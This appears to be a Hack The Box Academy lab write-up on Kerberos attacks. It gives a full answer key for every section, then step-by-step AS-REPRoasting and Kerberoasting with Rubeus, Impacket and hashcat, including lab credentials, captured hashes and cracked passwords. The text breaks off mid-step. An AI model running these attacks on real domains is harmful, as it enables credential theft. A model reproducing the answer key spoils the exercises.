Silver Ticket From Linux

| Section | Question Number | Answer |
| --- | --- | --- |
| AS-REPRoasting | Question 1 | carole.rose |
| AS-REPRoasting | Question 2 | jasmine |
| AS-REPRoasting from Linux | Question 1 | teddybear |
| Kerberoasting | Question 1 | jacob.kelly |
| Kerberoasting | Question 2 | tinkerbell |
| Kerberoasting from Linux | Question 1 | spongebob |
| Kerberos Delegations | Question 1 | S4U2Self |
| Kerberos Delegations | Question 2 | msDS-AllowedToActOnBehalfOfOtherIdentity |
| Unconstrained Delegation - Computers | Question 1 | HTB\_UnC0n$tr4\_in3d\_Delegat10N |
| Unconstrained Delegation - Computers | Question 2 | ABUSING\_Th3\_Pr1nT3r\_BuG |
| Unconstrained Delegation - Users | Question 1 | Abusing\_U$3r\_UnC0nstra1n3d\_DeleG4t1on |
| Constrained Delegation Overview & Attacking from Windows | Question 1 | Constrained\_D3L3g4t10N\_Fr0M\_W1n2 |
| Constrained Delegation from Linux | Question 1 | Fl4g\_C0nstrained\_Delg |
| RBCD Overview & Attacking from Windows | Question 1 | Carole\_Fl4G\_RBCD |
| RBCD from Linux | Question 1 | RBCD\_Fr0M\_L1Nux\_1S\_FuN |
| Golden Ticket | Question 1 | IMp3rs0natE\_Administrator\_2\_Op3n\_tH1s\_Fl4G |
| Golden Ticket from Linux | Question 1 | G0lD3n\_T1CK3t\_IMp3rs0nat10N\_Fr0M\_L1nUX |
| Silver Ticket | Question 1 | S1lV3r\_Tickets\_Ar3\_fUn\_4\_P3rs1sTent |
| Silver Ticket from Linux | Question 1 | M0rE\_S1lV3r\_Tickets |
| Pass-the-Ticket | Question 1 | P4SS\_Th3\_T1ckEt\_IsFUN |
| Account Enumeration & Password Spraying with Kerberos | Question 1 | adam.jones |
| Account Enumeration & Password Spraying with Kerberos | Question 2 | matilda.kens |
| Skills Assessment | Question 1 | daniel.whitehead |
| Skills Assessment | Question 2 | SERVER01 |
| Skills Assessment | Question 3 | annette.jackson |
| Skills Assessment | Question 4 | 1ef37acac52540fb3fa05924fcb1103a |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# AS-REPRoasting

## Question 1

### "What is the name of the account vulnerable to AS-REPRoasting whose name starts with "ca"?"

After spawning the target machine, students first need to connect to it with `xfreerdp` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:STMIP /dynamic-resolution
```

```
┌─[htb-ac-413848@htb-pofdwtjunw]─[~]
└──╼ $xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.96.73 /dynamic-resolution

[13:26:47:242] [3017:3018] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[13:26:47:242] [3017:3018] [WARN][com.freerdp.crypto] - CN = WS01.INLANEFREIGHT.LOCAL
[13:26:47:242] [3017:3018] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[13:26:47:242] [3017:3018] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[13:26:47:242] [3017:3018] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[13:26:47:242] [3017:3018] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.96.73:3389) 
[13:26:47:242] [3017:3018] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[13:26:47:242] [3017:3018] [ERROR][com.freerdp.crypto] - Common Name (CN):
[13:26:47:242] [3017:3018] [ERROR][com.freerdp.crypto] - 	WS01.INLANEFREIGHT.LOCAL
[13:26:47:242] [3017:3018] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.96.73:3389 (RDP-Server):
	Common Name: WS01.INLANEFREIGHT.LOCAL
	Subject:     CN = WS01.INLANEFREIGHT.LOCAL
	Issuer:      CN = WS01.INLANEFREIGHT.LOCAL
	Thumbprint:  56:5c:fd:bc:9f:35:08:24:c2:b1:9e:89:4d:86:02:cc:3b:c6:c8:d2:7a:48:d3:e3:21:56:9f:de:f7:19:2d:25
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, in a privileged PowerShell session, students need to navigate to `C:\Tools\` and invoke `Rubeus` to perform the `AS-REPRoasting` attack; students will find the account name that starts with "ca" to be `carole.rose`:

Code: powershell

```powershell
.\Rubeus.exe asreproast /nowrap
```

```
PS C:\Tools> .\Rubeus.exe asreproast /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: AS-REP roasting

[*] Target Domain          : INLANEFREIGHT.LOCAL

[*] Searching path 'LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'

<SNIP>

[*] SamAccountName         : carole.rose
[*] DistinguishedName      : CN=carole.rose,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\carole.rose'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$carole.rose@INLANEFREIGHT.LOCAL:47F0237297D3CD71FC5EF78BA12B6481$381D9CA05F04C8CF0555C16711281A1718C5C1D2A8AC1E82BA49F5BF42AA60FB8AB0AABB7F33EB0426311D6A066C415219E8245F256AFB827EBA32C1FCB04A8ACA74A6A1B23383DC2C8D99AE568ABF18883794C24EFC3BADE3842201DFD17759880CC4B449B164FA563EB910F97DF84D6CA85FEC59323A6AF3C3BFB6384FC285BCCA8D047DC1A7CF31774EDDDCB86E4F2A7871D840820C813E99B190C458C48ECF9068DB698331D846F1E5D7DB6F1580F37C920789433D3EC4DA842288540617819CF2AE3A45242FFEA042B1A061D519FFDDE031187090959303CECD155F4E81FF1F0BBF92FF7194FE60A01F8C58FBB800D411F3BD34DAC526D1
```

Answer: `carole.rose`

# AS-REPRoasting

## Question 2

### "What is the password for that account?"

Using the same RDP session from the previous question, students need to invoke `Rubeus` to perform the `AS-REPRoasting` attack, however, this time specifying `carole.rose` for the `/user:` argument to extract the password's hash of `carole.rose` only:

Code: powershell

```powershell
.\Rubeus.exe asreproast /nowrap /user:carole.rose /outfile:.\caroleRoseHash.txt
```

```
PS C:\Tools> .\Rubeus.exe asreproast /nowrap /user:carole.rose /outfile:.\caroleRoseHash.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: AS-REP roasting

[*] Target User            : carole.rose
[*] Target Domain          : INLANEFREIGHT.LOCAL

[*] Searching path 'LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=carole.rose))'
[*] SamAccountName         : carole.rose
[*] DistinguishedName      : CN=carole.rose,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\carole.rose'
[+] AS-REQ w/o preauth successful!
[*] Hash written to C:\Tools\caroleRoseHash.txt

[*] Roasted hashes written to : C:\Tools\caroleRoseHash.txt
```

Subsequently, students need to navigate to `C:\Tools\hashcat-6.2.6\` and use `hashcat.exe` to crack the password's hash, utilizing hash-mode `18200` `(Kerberos 5, etype 23, AS-REP)`; students will find that the plaintext password is `jasmine`:

Code: powershell

```powershell
.\hashcat.exe -m 18200 -w 3 -O ..\caroleRoseHash.txt ..\rockyou.txt
```

```
PS C:\Tools\hashcat-6.2.6> .\hashcat.exe -m 18200 -w 3 -O ..\caroleRoseHash.txt ..\rockyou.txt

hashcat (v6.2.6) starting

<SNIP>

$krb5asrep$carole.rose@INLANEFREIGHT.LOCAL:9bc5567248c59d348b18315764e0b5a0$8e5f43dfc13db0e86b5ecf23bf1cffddeb22a7758cbe0073382892fc5d883bd1c9f99b78c04953b48375a186fd5ad5dbbdd1298335dd38b9666db847da74f538d5f0ca7f0ded7ed35145d68ba36f7a6e536ae033ca84018731e92c04ab25ecd28b28f56a71a9decfd5a0d9a859c210e2f132bfbe00ed53ed4b7a0f81b67e0594e60b73587d834ed2634bd59fd8b699333936d0798d62dab6893459c91871986167bc29e56525ab220c8881ede54f4d1af953e90e7fd593d6d0af4b638d33565b88415d20920ec1f1f5eb27bbe9277efe02f25cdd3f2fd008a3dd5445b2b120fadb781736e563acdc819d96a749e5502b83cda2f35e1973b8ecf7:jasmine

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
<SNIP>
```

Answer: `jasmine`

# AS-REPRoasting from Linux

## Question 1

### "What is Amber's password, which has pre-authentication disabled?"

After spawning the target machine, students first need to create an entry for it in `/etc/hosts` with the domain name `inlanefreight.local`:

Code: shell

```shell
sudo sh -c 'echo "STMIP inlanefreight.local" >> /etc/hosts'
```

```
┌─[htb-ac-413848@htb-pofdwtjunw]─[~]
└──╼ $sudo sh -c 'echo "10.129.88.85 inlanefreight.local" >> /etc/hosts'
```

Subsequently, students need to use [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) to to enumerate users with their `UAC` value set to `DONT_REQ_PREAUTH` and request their hashes ([by default](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py), `GetNPUsers.py` outputs the passwords' hashes in `hashcat`'s format if the `-outputfile` is specified, however, students can also make it outputs them in `John the Ripper`'s format by using the argument `-format john`):

Code: shell

```shell
GetNPUsers.py inlanefreight.local/htb-student:'HTB_@cademy_stdnt!' -outputfile ./asreproastableHashes.txt
```

```
┌─[htb-ac-413848@htb-pofdwtjunw]─[~]
└──╼ $GetNPUsers.py inlanefreight.local/htb-student:'HTB_@cademy_stdnt!' -outputfile ./asreproastableHashes.txt

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Name         MemberOf  PasswordLastSet             LastLogon                   UAC      
-----------  --------  --------------------------  --------------------------  --------
amber.smith            2023-03-30 14:40:23.135840  2023-04-06 12:48:23.096956  0x410200 
jenna.smith            2022-10-14 13:00:00.581111  2023-04-06 12:48:23.096956  0x410200 
carole.rose            2022-10-14 13:00:03.377990  2023-04-06 12:48:23.096956  0x410200
```

Students then need to use `hashcat` to crack the passwords' hashes, utilizing hash-mode `18200` `(Kerberos 5, etype 23, AS-REP)`; students will find that the plaintext password of `amber.smith@INLANEFREIGHT.LOCAL` is `teddybear`:

Code: shell

```shell
hashcat -m 18200 -w 3 -O asreproastableHashes.txt /usr/share/wordlists/rockyou.txt
```

```
┌─[htb-ac-413848@htb-fiikmkavlq]─[~]
└──╼ $hashcat -m 18200 -w 3 -O asreproastableHashes.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

$krb5asrep$23$amber.smith@INLANEFREIGHT.LOCAL:06ee1568bf1c0727a6ef6c9c8d7a75ab$1bedd5adfccbda61b098917051f9bd2d557ebc94c691ce523b38df2511d7aa0937ae531dd3cc3a1d34b5fe0d6450f9d5c68a55b13aafbaa137352182c8a2e7fec929de55955eb5066251ff6edf7a57493c0cb14f5e2fc9203596b6b1404f36c5a2c44a348dcbf19c7a3e3f3fa89d31d658391b59edd00f9b0c078a6d259669f7d13441c8cca02e79b9dac6e830442f4f5e6df1a708ee4c29ea18c50c4735c3c5d8056ea7389e6e9be4595a1a9cf52b52ff27c31a193a832310d2c9a2cff5985bf97ac78e2b57b7334aa4bae19d986dbb49ba6b324a9b4eff281b62231c473cb04fa3df818cf95345bfc0eedbba451549ac2d8284070e6c447796:teddybear
```

Answer: `teddybear`

# Kerberoasting

## Question 1

### "What is the name of the Kerberoastable account whose name starts with "ja"?"

After spawning the target machine, students first need to connect to it with `xfreerdp` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:STMIP /dynamic-resolution
```

```
┌─[htb-ac-413848@htb-fiikmkavlq]─[~]
└──╼ $xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.205.26 /dynamic-resolution
[22:01:46:490] [3034:3035] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-413848/.config/freerdp
[22:01:46:490] [3034:3035] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-413848/.config/freerdp/certs]
[22:01:46:490] [3034:3035] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-413848/.config/freerdp/server]
[22:01:46:506] [3034:3035] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[22:01:46:506] [3034:3035] [WARN][com.freerdp.crypto] - CN = WS01.INLANEFREIGHT.LOCAL
[22:01:46:506] [3034:3035] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[22:01:46:506] [3034:3035] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[22:01:46:506] [3034:3035] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[22:01:46:506] [3034:3035] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.205.26:3389) 
[22:01:46:506] [3034:3035] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[22:01:46:506] [3034:3035] [ERROR][com.freerdp.crypto] - Common Name (CN):
[22:01:46:506] [3034:3035] [ERROR][com.freerdp.crypto] - 	WS01.INLANEFREIGHT.LOCAL
[22:01:46:506] [3034:3035] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.205.26:3389 (RDP-Server):
	Common Name: WS01.INLANEFREIGHT.LOCAL
	Subject:     CN = WS01.INLANEFREIGHT.LOCAL
	Issuer:      CN = WS01.INLANEFREIGHT.LOCAL
	Thumbprint:  56:5c:fd:bc:9f:35:08:24:c2:b1:9e:89:4d:86:02:cc:3b:c6:c8:d2:7a:48:d3:e3:21:56:9f:de:f7:19:2d:25
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, in a privileged PowerShell session, students need to navigate to `C:\Tools\` and invoke `Rubeus` to perform the `Kerberoasting` attack; students will find that the account name that starts with "ja" to be `jacob.kelly`:

Code: powershell

```powershell
.\Rubeus.exe kerberoast /nowrap
```

```
PS C:\Tools> .\Rubeus.exe kerberoast /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 6

<SNIP>

[*] SamAccountName         : jacob.kelly
[*] DistinguishedName      : CN=jacob.kelly,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : SVC/FILER02.inlanefreight.local
[*] PwdLastSet             : 10/14/2022 7:00:23 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*jacob.kelly$INLANEFREIGHT.LOCAL$SVC/FILER02.inlanefreight.local@INLANEFREIGHT.LOCAL*$E2353597F48DE72431B06676D5B44CDA$97252970CD1028CEDF5AC1907F2CAD54C23E367491819D61C68C52A89115348705DEC2BE99F7FAC92EC5375E23D1DF1058355D7A395CDF5457759213B7530F4C11E28A386C61705D1072D0EE23B050A19A3897FB5E6C7818900AB0A8643390371B841EB30F19CADF5616CBDF7AD523C29C18A20FEB36B4C28648E50E0CF786761489896BF248E81E09B5576B633A595625FD85C41BD14A1C13388492AFA77A462D0D20C3BD59FBAC08DC410D7E434860D4340CF103F403BE642F70DDF6C72C5E2583092FFCA9A9026FC29610590C795118F39A0886CB4FD575DF6BD2FB2E6DD33871845A238C8F77044C4FA315927EA8287ED6F20B1FE28240DB7FA8E8B813F821CC6EB488C8738E85780334F563E6B231C1D5C16963164887BC73C02B287DD00BE59C83E55F167BFAF3ED53B9CA4A1703EFE21C3D034D7F1327796E9B9ACB76F5872F37F83B8750CBDF3DA2E9A80C16C1E41BF3AD2C8FD2D1D77440161A39EC9181A36A3D9A150CFBC1178A1C08C28B7F2D51206C8DED877EF8D9532BD31510F9A9CF73A402ADBAB150BD596E9C108D1F73CC34EC0F1ECEF33E805478BB5AB620AB3396BBABE10AED3FAF7DF2854BE167D74210880EA03F301842262A4CCEC650298C46E3E12966AA6E084E6FADA27EE71D3E12A3B1772E7F18011C27E4FC7FC045A86D6A30325F981C37018727BE3C1A8FADEBC8C2398A1CAE3D7E8D468D0D36B2DD7B43D29975DE521DE73C050086AA94E5B538820F9CC3EE6F75BD98694619E3904CAF3B3961BB8DAA1D2D94C93677C63313FA59003DCF9DB848095E64C4686B836B8F7F0753CAFAEBBDC13024EB0FB32BC4B25F2B0ACF69F7E692296192DB9718C2F8BC7D4C5FCC402565876C883C9B0D2936DDA59B4C715C773FEF612E33C360637F264909AB4127576D8912B2E0620E5CBB35A0D84C5B9FB74D767069719235753726DC2015B2A9203A2ABF64A193137AAA4FAF0043BC4D1CF7B7798C7A7B9EB72E4DC84A387E11B9BED71F92C95F33438E638C66AB3DA812F1DE4E7F15C0E5ADD02136694DEF7BF4F612BC51ADDA33B9653A1A640DF890049587209EBEC7EB396182F003640280DD88AA3CD2E623FDADD05805CD42F5F4D68BF597B26E2F646CF849BE34D1D99E3612AB5C91580A9C4B7F00BDF312366CA9658544A70060DE87F3F91D2D7839C6489E43AA5EEA6628B325FDFDF83831AB8069EB0A8BA88C24CD8A93EB57D2996C75AF553B477DD7A8D8A65300A2BD3A8B9E5736895A0C341DC566AA3388E60AA59E112600A1CAAC4B064AF9EF49E36CFF5A1CBE7B25DC513BFDFF9E7410B3377BDA914B33A8DCC914E3D887A56EC6E959F6C4A7FC3ED251E385F9B4A80E3FD89FECE1E78FFFD10498631F4E6EDD833203BD0D6273708111FCEB61669A622B1BD653D153211AA73E2CA7593C48FDD6EF728F7EC6921C4C2844BD92D88B545C63803A1BB45C424FFED234555D2F9E65E6A31EE3DEBA166BC8F40878EE5434455FC4665709B3A64A609FBEE09095D708427522861CC4E9F00332928D0FEBAA8D42510945B930964BE22DD9AE1ACD56A0F345080B5079C9B815E5F9B8FDB751F3996D10A326DE4298D0C9C8049D62C0A5056895D791B15AD9B8728FDD1C6BF91E4F9EDA9E057C32C97CCBFAFED73E1E75AA46B40C2D96C24525994ACD3EA619FB9A7AB656C29DF86203BE914ED860AF7E
```

Answer: `jacob.kelly`

# Kerberoasting

## Question 2

### "What is the password for that account?"

Using the same RDP session from the previous question, students need to use `Rubeus` to perform the `Kerberoasting` attack, and specify `jacob.kelly` for the `/user:` argument to extract the password's hash of `jacob.kelly` only:

Code: powershell

```powershell
.\Rubeus.exe kerberoast /nowrap /user:jacob.kelly /outfile:.\caroleRoseHash.txt
```

```
PS C:\Tools> .\Rubeus.exe kerberoast /nowrap /user:jacob.kelly /outfile:.\jacobKellyHash.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : jacob.kelly
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=jacob.kelly)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : jacob.kelly
[*] DistinguishedName      : CN=jacob.kelly,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : SVC/FILER02.inlanefreight.local
[*] PwdLastSet             : 10/14/2022 7:00:23 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Tools\jacobKellyHash.txt

[*] Roasted hashes written to : C:\Tools\jacobKellyHash.txt
```

Subsequently, students need to navigate to `C:\Tools\hashcat-6.2.6\` and use `hashcat.exe` to crack the password's hash, utilizing hash-mode `13100` (`Kerberos 5, etype 23, TGS-REP`); students will find that the plaintext password is `tinkerbell`:

Code: powershell

```powershell
.\hashcat.exe -m 13100 -w 3 -O ..\jacobKellyHash.txt ..\rockyou.txt
```

```
PS C:\Tools\hashcat-6.2.6> .\hashcat.exe -m 13100 -w 3 -O ..\jacobKellyHash.txt ..\rockyou.txt

hashcat (v6.2.6) starting

<SNIP>

$krb5tgs$23$*jacob.kelly$INLANEFREIGHT.LOCAL$SVC/FILER02.inlanefreight.local@INLANEFREIGHT.LOCAL*$e2353597f48de72431b06676d5b44cda$97252970cd1028cedf5ac1907f2cad54c23e367491819d61c68c52a89115348705dec2be99f7fac92ec5375e23d1df1058355d7a395cdf5457759213b7530f4c11e28a386c61705d1072d0ee23b050a19a3897fb5e6c7818900ab0a8643390371b841eb30f19cadf5616cbdf7ad523c29c18a20feb36b4c28648e50e0cf786761489896bf248e81e09b5576b633a595625fd85c41bd14a1c13388492afa77a462d0d20c3bd59fbac08dc410d7e434860d4340cf103f403be642f70ddf6c72c5e2583092ffca9a9026fc29610590c795118f39a0886cb4fd575df6bd2fb2e6dd33871845a238c8f77044c4fa315927ea8287ed6f20b1fe28240db7fa8e8b813f821cc6eb488c8738e85780334f563e6b231c1d5c16963164887bc73c02b287dd00be59c83e55f167bfaf3ed53b9ca4a1703efe21c3d034d7f1327796e9b9acb76f5872f37f83b8750cbdf3da2e9a80c16c1e41bf3ad2c8fd2d1d77440161a39ec9181a36a3d9a150cfbc1178a1c08c28b7f2d51206c8ded877ef8d9532bd31510f9a9cf73a402adbab150bd596e9c108d1f73cc34ec0f1ecef33e805478bb5ab620ab3396bbabe10aed3faf7df2854be167d74210880ea03f301842262a4ccec650298c46e3e12966aa6e084e6fada27ee71d3e12a3b1772e7f18011c27e4fc7fc045a86d6a30325f981c37018727be3c1a8fadebc8c2398a1cae3d7e8d468d0d36b2dd7b43d29975de521de73c050086aa94e5b538820f9cc3ee6f75bd98694619e3904caf3b3961bb8daa1d2d94c93677c63313fa59003dcf9db848095e64c4686b836b8f7f0753cafaebbdc13024eb0fb32bc4b25f2b0acf69f7e692296192db9718c2f8bc7d4c5fcc402565876c883c9b0d2936dda59b4c715c773fef612e33c360637f264909ab4127576d8912b2e0620e5cbb35a0d84c5b9fb74d767069719235753726dc2015b2a9203a2abf64a193137aaa4faf0043bc4d1cf7b7798c7a7b9eb72e4dc84a387e11b9bed71f92c95f33438e638c66ab3da812f1de4e7f15c0e5add02136694def7bf4f612bc51adda33b9653a1a640df890049587209ebec7eb396182f003640280dd88aa3cd2e623fdadd05805cd42f5f4d68bf597b26e2f646cf849be34d1d99e3612ab5c91580a9c4b7f00bdf312366ca9658544a70060de87f3f91d2d7839c6489e43aa5eea6628b325fdfdf83831ab8069eb0a8ba88c24cd8a93eb57d2996c75af553b477dd7a8d8a65300a2bd3a8b9e5736895a0c341dc566aa3388e60aa59e112600a1caac4b064af9ef49e36cff5a1cbe7b25dc513bfdff9e7410b3377bda914b33a8dcc914e3d887a56ec6e959f6c4a7fc3ed251e385f9b4a80e3fd89fece1e78fffd10498631f4e6edd833203bd0d6273708111fceb61669a622b1bd653d153211aa73e2ca7593c48fdd6ef728f7ec6921c4c2844bd92d88b545c63803a1bb45c424ffed234555d2f9e65e6a31ee3deba166bc8f40878ee5434455fc4665709b3a64a609fbee09095d708427522861cc4e9f00332928d0febaa8d42510945b930964be22dd9ae1acd56a0f345080b5079c9b815e5f9b8fdb751f3996d10a326de4298d0c9c8049d62c0a5056895d791b15ad9b8728fdd1c6bf91e4f9eda9e057c32c97ccbfafed73e1e75aa46b40c2d96c24525994acd3ea619fb9a7ab656c29df86203be914ed860af7e:tinkerbell
```

Answer: `tinkerbell`

# Kerberoasting from Linux

## Question 1

### "What is Adam's password, a Kerberoastable account?"

After spawning the target machine, students first need to create an entry for it in `/etc/hosts` with the domain name `inlanefreight.local`:

Code: shell

```shell
sudo sh -c 'echo "STMIP inlanefreight.local" >> /etc/hosts'
```

```
┌─[htb-ac-413848@htb-fiikmkavlq]─[~]
└──╼ $sudo sh -c 'echo "10.129.250.69 inlanefreight.local" >> /etc/hosts'
```

Subsequently, students need to utilize [GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) to enumerate `Kerberoastable` accounts, to find `adam.jones` as one of them:

Code: shell

```shell
GetUserSPNs.py inlanefreight.local/htb-student:'HTB_@cademy_stdnt!'
```

```
┌─[htb-ac-413848@htb-fiikmkavlq]─[~]
└──╼ $GetUserSPNs.py inlanefreight.local/htb-student:'HTB_@cademy_stdnt!'

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

ServicePrincipalName                     Name           MemberOf  PasswordLastSet             LastLogon                   Delegation    
---------------------------------------  -------------  --------  --------------------------  --------------------------  -------------
CIFS/fake.inlanefreight.local            callum.dixon             2022-10-14 12:59:52.112360  <never>                     unconstrained 
HTTP/DC01                                beth.richards            2022-10-14 12:59:54.502995  2023-04-01 17:05:55.494221  constrained   
MSSQL_svc_dev/inlanefreight.local:1433   sqldev                   2022-10-14 13:00:06.487374  <never>                                   
MSSQLSvc/SQL01:1433                      sqlprod                  2022-10-14 13:00:09.815510  <never>                                   
MSSQL_svc_qa/inlanefreight.local:1433    sqlqa                    2022-10-14 13:00:12.846748  <never>                                   
MSSQL_svc_test/inlanefreight.local:1433  sql-test                 2022-10-14 13:00:16.409248  <never>                                   
IIS_dev/inlanefreight.local:80           adam.jones               2023-03-30 15:49:38.760866  <never>                                   
SVC/FILER02.inlanefreight.local          jacob.kelly              2022-10-14 13:00:23.127990  <never>
```

Students need to then extract `adam.jones`'s service account password hash with `GetUserSPNs.py`, specifying `adam.jones` for the `-request-user` argument:

Code: shell

```shell
GetUserSPNs.py inlanefreight.local/htb-student:'HTB_@cademy_stdnt!' -request -outputfile ./adamJonesHash.txt -request-user adam.jones
```

```
┌─[htb-ac-413848@htb-fiikmkavlq]─[~]
└──╼ $GetUserSPNs.py inlanefreight.local/htb-student:'HTB_@cademy_stdnt!' -request -outputfile ./adamJonesHash.txt -request-user adam.jones

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

ServicePrincipalName            Name        MemberOf  PasswordLastSet             LastLogon  Delegation 
------------------------------  ----------  --------  --------------------------  ---------  ----------
IIS_dev/inlanefreight.local:80  adam.jones            2023-03-30 15:49:38.760866  <never>               

[-] CCache file is not found. Skipping...
```

Subsequently, students need to use `hashcat` to crack the passwords' hashes, utilizing hash-mode `13100` `(Kerberos 5, etype 23, TGS-REP)`; students will find that the plaintext password of `adam.jones` is `spongebob`:

Code: shell

```shell
hashcat -m 13100 -w 3 -O adamJonesHash.txt /usr/share/wordlists/rockyou.txt
```

```
┌─[htb-ac-413848@htb-fiikmkavlq]─[~]
└──╼ $hashcat -m 13100 -w 3 -O adamJonesHash.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

